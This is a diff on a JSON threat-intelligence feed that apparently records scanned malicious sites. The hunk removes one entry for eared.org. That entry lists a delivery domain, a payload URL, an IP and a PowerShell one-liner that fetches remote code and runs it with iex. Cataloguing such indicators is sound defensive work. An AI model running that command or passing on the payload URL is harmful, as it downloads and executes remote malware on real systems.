@@ -8299,24 +8299,5 @@
     ],
     "ReportId": "cmwao8o3p01la0omlmotcq335",
     "ScannedAt": "2026-11-10T12:33:41.704000+00:00"
-  },
-  {
-    "UrlDomain": "eared.org",
-    "DeliveryUrl": [
-      "t-trustresnew.com"
-    ],
-    "PayloadUrl": [
-      "https://t-trustresnew.com/Girya/c2bb5e53eeac1f49"
-    ],
-    "IP": [
-      "179.43.116.166"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://t-trustresnew[.]com/Girya/c2bb5e53eeac1f49')|iex",
-    "ResolvedDownloadUrl": [
-      "https://t-trustresnew.com/Girya/c2bb5e53eeac1f49"
-    ],
-    "ReportId": "cmwanjbw9018m0omlq3184wsq",
-    "ScannedAt": "2026-11-10T12:13:59.457000+00:00"
   }
 ]
